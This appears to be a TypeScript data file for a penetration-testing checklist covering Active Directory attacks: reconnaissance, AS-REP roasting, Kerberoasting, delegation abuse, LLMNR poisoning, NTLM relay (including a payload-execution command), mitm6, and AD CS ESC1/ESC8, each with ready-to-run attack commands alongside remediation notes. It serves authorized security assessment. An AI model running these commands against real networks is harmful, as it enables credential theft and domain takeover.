import type { ChecklistCategory } from "../types/checklist";
import { applyContentReview } from "../lib/contentReview";

export const networkAdCategories: ChecklistCategory[] = [
  {
    id: "ad-recon-enum",
    name: "Active Directory Reconnaissance & Enumeration",
    emoji: "🗺️",
    description: "Domain discovery, user/group enumeration, BloodHound graph collection, and trust mapping.",
    reference: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
    items: [
      {
        id: "ad-recon-1",
        text: "Domain & Forest Architecture Mapping",
        how: "Query Domain Controllers, domain name, functional levels, and trusted domains using native tools or PowerView.",
        payloads: [
          "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()",
          "nltest /domain_trusts /all_trusts /v",
          "Get-NetDomainTrust -Domain target.local"
        ],
        payloadNotes: [
          "GetCurrentDomain(): Native .NET assembly call that returns the current domain, domain controllers, and domain mode without touching cmd.exe.",
          "nltest /domain_trusts: Queries all inbound and outbound trust relationships between child domains, parent forests, and external partner domains.",
          "Get-NetDomainTrust: PowerView cmdlet that enumerates bidirectional or transitive trusts that can be traversed during lateral movement."
        ],
        expectedResponse: {
          vulnerable: "Trusts with SidFilteringDisabled or bidirectional transitive trusts allow hopping into high-privilege parent forests.",
          safe: "Domain functional level is modern (2016+), SID filtering is enforced, and non-essential trusts are severed."
        },
        severity: "medium"
      },
      {
        id: "ad-recon-2",
        text: "BloodHound Graph Collection & Attack Path Analysis",
        how: "Collect Active Directory object relationships (users, groups, ACLs, sessions) to discover paths to Domain Admin.",
        payloads: [
          "SharpHound.exe -c All --outputdirectory C:\\Temp --zipfilename ad_collection",
          "bloodhound-python -u 'user' -p 'password' -d 'domain.local' -dc 'dc01.domain.local' -c All"
        ],
        payloadNotes: [
          "SharpHound -c All: Collects group memberships, active local admin rights, Dacl/ACL relationships, and active user logon sessions.",
          "bloodhound-python: Linux-native python collector for remote collection without needing an unmanaged Windows binary execution on disk."
        ],
        expectedResponse: {
          vulnerable: "Short privilege escalation paths exist (e.g., GenericAll over a group that has local admin on a machine logged into by Domain Admin).",
          safe: "Privilege tiers are strictly separated; administrative accounts never log in to lower-tier workstation endpoints."
        },
        severity: "high"
      },
      {
        id: "ad-recon-3",
        text: "Unauthenticated / Anonymous LDAP & RPC Bind",
        how: "Test if Domain Controllers allow anonymous binds or null sessions to dump user lists and password policies.",
        payloads: [
          "ldapsearch -x -H ldap://dc01.domain.local -s base namingcontexts",
          "rpcclient -U \"\" -N dc01.domain.local -c 'enumdomusers'",
          "crackmapexec smb dc01.domain.local -u '' -p '' --users"
        ],
        payloadNotes: [
          "ldapsearch -x: Anonymous bind query checking if namingContexts and base directory tree can be viewed without credentials.",
          "rpcclient null session: Tests if IPC$ allows unauthenticated connection and user RID cycling via RPC.",
          "crackmapexec null user: Checks if SMB allows unauthenticated listing of domain users and password policies."
        ],
        expectedResponse: {
          vulnerable: "Server returns list of domain user accounts, password complexity requirements, or account lockout thresholds without authentication.",
          safe: "Server rejects anonymous LDAP queries (LdapEnforceChannelBinding, LDAP Server Integrity) and disables SMB null sessions."
        },
        severity: "high"
      }
    ]
  },
  {
    id: "ad-kerberos",
    name: "Kerberos Attacks & Ticket Exploitation",
    emoji: "🎟️",
    description: "Kerberoasting, AS-REP Roasting, Golden/Silver Tickets, and delegation abuses.",
    reference: "https://adsecurity.org/?p=3458",
    items: [
      {
        id: "ad-kerb-1",
        text: "AS-REP Roasting (No Pre-Authentication Accounts)",
        how: "Identify user accounts with 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) and request offline-crackable AS-REP hashes.",
        payloads: [
          "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth",
          "impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes",
          "Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes"
        ],
        payloadNotes: [
          "Read-only inventory of preauthentication-disabled accounts; scope the directory query to the authorized fixture.",
          "Lab-only: GetNPUsers requests AS-REP material for the listed synthetic accounts. Ticket encryption and supported formats depend on account/DC configuration.",
          "Lab-only: Rubeus collects AS-REP material. Offline password testing is a separate bounded assessment; requests may generate Kerberos events."
        ],
        expectedResponse: {
          vulnerable: "Active domain accounts have pre-authentication disabled and use weak/crackable passwords.",
          safe: "Kerberos pre-authentication is enforced across all domain user accounts (DoesNotRequirePreAuth = False)."
        },
        severity: "critical"
      },
      {
        id: "ad-kerb-2",
        text: "Kerberoasting Service Accounts (SPN Enumeration)",
        how: "Query accounts that have a Service Principal Name (SPN) set and request TGS ticket encrypted with service account NTLM hash.",
        payloads: [
          "GetUserSPNs.py domain.local/user:password -outputfile kerberoast.hashes",
          "Rubeus.exe kerberoast /outfile:kerberoast.hashes /nowrap",
          "hashcat -m 13100 kerberoast.hashes rockyou.txt"
        ],
        payloadNotes: [
          "Version-dependent Impacket ticket request for scoped synthetic SPN accounts. Requestability alone is expected Kerberos behavior.",
          "Lab-only Rubeus service-ticket collection; record actual RC4/AES etype and effective account privileges.",
          "Offline mode 13100 applies to RC4 TGS material, not every ticket type. Use only an agreed synthetic credential-strength fixture."
        ],
        expectedResponse: {
          vulnerable: "High-privilege service accounts (Domain Admins or Server Admins) have SPNs configured and use weak, crackable passwords.",
          safe: "Service accounts use Group Managed Service Accounts (gMSA) with 128-character rotating passwords, or AES-256 with strong secrets."
        },
        severity: "high"
      },
      {
        id: "ad-kerb-3",
        text: "Kerberos Delegation Abuse (Unconstrained & Constrained)",
        how: "Audit machines and accounts configured with Unconstrained Delegation (TRUSTED_FOR_DELEGATION) or Resource-Based Constrained Delegation.",
        payloads: [
          "Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation",
          "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo",
          "Rubeus.exe s4u /user:CompAccount$ /rc4:hash /impersonate:Administrator /msdsspn:cifs/target.local /ptt"
        ],
        payloadNotes: [
          "Read unconstrained-delegation computer flags; DCs require separate interpretation and effective policy must be checked.",
          "Read classic constrained-delegation targets. RBCD is stored in a different security-descriptor attribute and requires separate review.",
          "Lab-only S4U fixture requiring the service account's key, effective delegation permission and an eligible target identity; it does not work for arbitrary users/services."
        ],
        expectedResponse: {
          vulnerable: "Unconstrained delegation servers allow attackers who compromise the host to harvest Domain Admin TGTs passing through.",
          safe: "Sensitive accounts are marked 'Account is sensitive and cannot be delegated', and RBCD or modern Protected Users group is enforced."
        },
        severity: "critical"
      }
    ]
  },
  {
    id: "ad-net-mitm",
    name: "Network Protocol Poisoning & Relay",
    emoji: "⚡",
    description: "LLMNR/NBT-NS poisoning, SMB signing bypass, and IPv6 DNS spoofing.",
    reference: "https://support.microsoft.com/en-us/topic/smb-security-best-practices",
    items: [
      {
        id: "ad-net-1",
        text: "LLMNR / NBT-NS Name Resolution Poisoning",
        how: "Listen for multicast/broadcast queries caused by typos or unresolvable internal hostnames and spoof responses to capture NetNTLMv2 hashes.",
        payloads: [
          "responder -I eth0 -dwv",
          "hashcat -m 5600 netntlmv2.txt rockyou.txt"
        ],
        payloadNotes: [
          "Responder: Spoofs LLMNR (UDP 5355), NBT-NS (UDP 137), and MDNS responses when primary DNS query fails, tricking clients into authenticating.",
          "NetNTLMv2: Challenge-response hash captured can be cracked offline or relayed to un-signed services."
        ],
        expectedResponse: {
          vulnerable: "Clients broadcast name queries and send NetNTLMv2 hashes to rogue listener.",
          safe: "LLMNR and NetBIOS are disabled via Group Policy (Computer Configuration -> Administrative Templates -> Network -> DNS Client)."
        },
        severity: "high"
      },
      {
        id: "ad-net-2",
        text: "SMB Signing Disabled & NTLM Relay",
        how: "Scan network for systems where SMB Signing is not required, and relay captured NTLM authentications to execute code or dump SAM/LSA.",
        payloads: [
          "crackmapexec smb 192.168.1.0/24 --gen-relay-list smb_targets.txt",
          "ntlmrelayx.py -tf smb_targets.txt -smb2support -socks",
          "ntlmrelayx.py -tf smb_targets.txt -smb2support -e payload.exe"
        ],
        payloadNotes: [
          "Discovery of signing-not-required candidates, not proof of relay. Prefer read-only effective policy inspection on isolated fixture hosts.",
          "Lab-only relay fixture: needs accepted NTLM, a relayable authentication source, target authorization and no effective relay protection. A session is not necessarily administrative.",
          "Historical payload-execution example, not a default test: replace with a harmless isolated-lab marker operation. Never execute arbitrary payloads against production hosts."
        ],
        expectedResponse: {
          vulnerable: "Workstations and servers have SMB Signing set to optional, allowing relay attacks to gain SYSTEM shells.",
          safe: "SMB Signing is required on all servers and workstations (RequireSecuritySignature = True)."
        },
        severity: "critical"
      },
      {
        id: "ad-net-3",
        text: "IPv6 DNS Takeover via mitm6",
        how: "Respond to DHCPv6 requests on corporate networks that do not have active IPv6 infrastructure to become the default DNS server and relay to LDAP.",
        payloads: [
          "mitm6 -d domain.local",
          "ntlmrelayx.py -6 -t ldaps://dc01.domain.local -wh rogue-wpad --delegate-access"
        ],
        payloadNotes: [
          "mitm6: Windows machines routinely request IPv6 configuration even if IPv6 isn't in use; mitm6 assigns itself as the IPv6 DNS server.",
          "LDAPS relay: Relaying authentication to Active Directory LDAP creates a machine account or grants Resource-Based Constrained Delegation."
        ],
        expectedResponse: {
          vulnerable: "Windows clients automatically adopt rogue IPv6 DNS and query WPAD/AD services through attacker proxy.",
          safe: "IPv6 is properly configured or disabled, and LDAP Channel Binding & Signing are enforced on all Domain Controllers."
        },
        severity: "critical"
      }
    ]
  },
  {
    id: "ad-pki-cs",
    name: "Active Directory Certificate Services (AD CS)",
    emoji: "📜",
    description: "Certificate template misconfigurations (ESC1 - ESC8) enabling instant domain escalation.",
    reference: "https://posts.specterops.io/certified-pre-owned-d95910965ada",
    items: [
      {
        id: "ad-cs-1",
        text: "AD CS ESC1: Client Authentication & Enrollee Supplies Subject",
        how: "Audit Certificate Templates where low-privilege users can request certificates, Client Authentication EKU is enabled, and enrollee supplies SAN.",
        payloads: [
          "Certify.exe find /vulnerable",
          "Certify.exe request /ca:CA-SERVER\\CA-NAME /template:VulnerableTemplate /altname:Administrator",
          "Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:pass /ptt"
        ],
        payloadNotes: [
          "Template inventory; verify enrollment ACLs, publication, EKUs, approval requirements and effective strong certificate mapping on the actual patched DC.",
          "Historical SAN-supply example; use only synthetic lab identities. A supplied privileged name is not proof of successful authentication under current strong-mapping policy.",
          "Lab-only certificate-authentication step. Record which account the issued certificate actually maps to; successful enrollment alone does not establish escalation."
        ],
        expectedResponse: {
          vulnerable: "A certificate template allows any authenticated user to supply a SAN for Administrator and receive an authentication certificate.",
          safe: "Certificate templates require Manager Approval, Authorized Signatures, or do not permit user-supplied SANs."
        },
        severity: "critical"
      },
      {
        id: "ad-cs-2",
        text: "AD CS ESC8: NTLM Relay to AD CS HTTP Web Enrollment",
        how: "Test if the Active Directory Certificate Services Web Enrollment endpoint (/certsrv/) supports NTLM authentication without EPA or HTTPS.",
        payloads: [
          "ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine",
          "python3 PetitPotam.py <attacker-ip> <dc-ip>"
        ],
        payloadNotes: [
          "ESC8 flow: Triggering a DC or high-privilege machine to authenticate (via PetitPotam or PrinterBug) relays machine NTLM to the HTTP AD CS endpoint.",
          "Relay result: Issues a computer certificate for the Domain Controller, which is exchanged for a DC TGT to perform DCSync."
        ],
        expectedResponse: {
          vulnerable: "The AD CS HTTP enrollment web service accepts relayed NTLM authentication and returns valid machine certificates.",
          safe: "HTTP Web Enrollment service is removed or enforces HTTPS with Extended Protection for Authentication (EPA)."
        },
        severity: "critical"
      }
    ]
  }
];
applyContentReview("network_ad", networkAdCategories);
